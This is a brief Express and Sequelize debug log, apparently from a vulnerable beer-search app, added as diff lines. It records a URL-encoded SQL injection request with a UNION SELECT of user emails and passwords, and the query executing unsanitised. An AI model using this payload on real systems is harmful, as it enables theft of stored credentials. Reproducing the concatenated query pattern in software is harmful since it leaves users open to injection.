+Thu, 18 Dec 2025 12:41:47 GMT express:router dispatching GET /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+Thu, 18 Dec 2025 12:41:47 GMT express:router query  : /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+Thu, 18 Dec 2025 12:41:47 GMT express:router expressInit  : /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+Thu, 18 Dec 2025 12:41:47 GMT express:router jsonParser  : /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+Thu, 18 Dec 2025 12:41:47 GMT body-parser:json skip empty body
+Thu, 18 Dec 2025 12:41:47 GMT express:router session  : /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+Thu, 18 Dec 2025 12:41:47 GMT express-session no SID sent, generating session
+Thu, 18 Dec 2025 12:41:47 GMT express:router cookieParser  : /v1/search/name/%27%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--%20
+2025-12-18T12:41:47.480Z sequelize:sql:sqlite Executing (default): SELECT * FROM beers WHERE name = ''' UNION SELECT id,email,password,4,5,6,7,8,9 FROM users-- '
+2025-12-18T12:41:47.481Z sequelize:sql:sqlite Executed (default): SELECT * FROM beers WHERE name = ''' UNION SELECT id,email,password,4,5,6,7,8,9 FROM users-- '
+Thu, 18 Dec 2025 12:41:47 GMT express-session saving 1766061707477
+Thu, 18 Dec 2025 12:41:47 GMT express-session set-cookie sessionID=s%3A1766061707477.5aOokSoSEHqCMTpvBi0DmTMLx5Fiv1Jp1MbE4k4HeuI; Path=/; Expires=Fri, 17 Apr 2026 12:41:47 GMT; SameSite=Lax
+Thu, 18 Dec 2025 12:41:47 GMT express-session split response
